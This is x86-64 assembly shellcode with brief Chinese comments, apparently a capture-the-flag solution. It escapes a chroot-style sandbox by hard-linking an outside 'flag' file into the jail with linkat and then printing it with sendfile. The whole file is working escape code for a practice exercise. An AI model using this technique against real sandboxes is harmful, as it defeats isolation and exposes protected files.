# 对于不同限制的沙盒, 使用不同的系统调用达成访问文件
# 这题限制使用linkat系统调用, 将外面的文件路径链接到沙盒中, 即可实现对沙盒外文件的调用
# 这里使用了字符串, 但是用数字rsp指针可能会更好一些

.global _start
_start:
.intel_syntax noprefix
        # open('/jail/')
        xor rax, rax
        mov al, 2
        lea rdi, [rip+root]
        xor rsi, rsi
        xor rdx, rdx
        syscall
        # linkat('/', './flag', '/jail/', './flbg')
        mov rdi, 3
        lea rsi, [rip+flag]
        mov rdx, rax
        mov ax, 265
        lea r10, [rip+flbg]
        xor r8, r8  # flag默认即可
        syscall
        # sendfile(1, open('./flbg'), 0, 0)
        xor rax, rax
        mov al, 2
        lea rdi, [rip+flbg]
        xor rsi, rsi
        xor rdx, rdx
        syscall
        mov esi, eax
        mov al, 40
        xor edi, edi
        inc edi
        mov r10w, 0x3e8
        syscall
root:
        .string "./"
flag:
        .string "./flag"
flbg:
        .string "./flbg"
